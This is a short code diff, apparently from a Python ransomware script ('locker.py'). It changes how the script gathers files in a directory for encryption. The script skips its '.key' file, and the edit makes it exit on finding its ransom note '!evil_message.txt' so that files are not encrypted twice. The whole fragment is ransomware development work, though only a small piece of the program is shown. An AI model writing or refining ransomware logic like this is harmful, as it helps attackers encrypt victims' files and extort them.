@@ -11,7 +11,8 @@ for file in os.listdir():
        file == ".key" or os.path.isdir(file):
         continue
     elif file == "!evil_message.txt":
-        break
+        # prevent double encryption by looking for locker.py message file
+        exit()
     else:
         files.append(file)
 if len(files) > 0:
